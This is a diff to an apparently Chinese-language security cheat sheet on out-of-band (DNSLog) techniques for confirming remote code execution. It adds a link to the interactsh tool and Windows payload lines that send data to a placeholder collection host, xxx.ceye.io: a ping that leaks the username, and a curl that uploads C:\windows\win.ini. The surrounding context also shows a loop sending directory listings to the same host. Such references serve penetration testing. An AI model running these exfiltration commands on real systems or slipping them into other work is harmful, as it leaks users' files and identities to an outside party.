@@ -46,12 +46,19 @@
     ```
 - [yumusb/DNSLog-Platform-Golang](https://github.com/yumusb/DNSLog-Platform-Golang) - DNSLOG平台 golang 一键启动版
 - [phith0n/conote-community](https://github.com/phith0n/conote-community) - Conote 综合安全测试平台社区版
+- [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library
 
 ---
 
 ## rce
 
 **Windows**
+
+- ping
+
+    ```
+    ping %USERNAME%.xxx.ceye.io
+    ```
 
 - certutil
 
@@ -65,6 +72,8 @@
     windows 环境默认是支持 curl 的
     ```bash
     for /F %x in ('dir /b c:\') do curl http://xxx.ceye.io/%x
+
+    curl -F file=@C:\windows\win.ini http://xxx.ceye.io
     ```
 
 **linux**
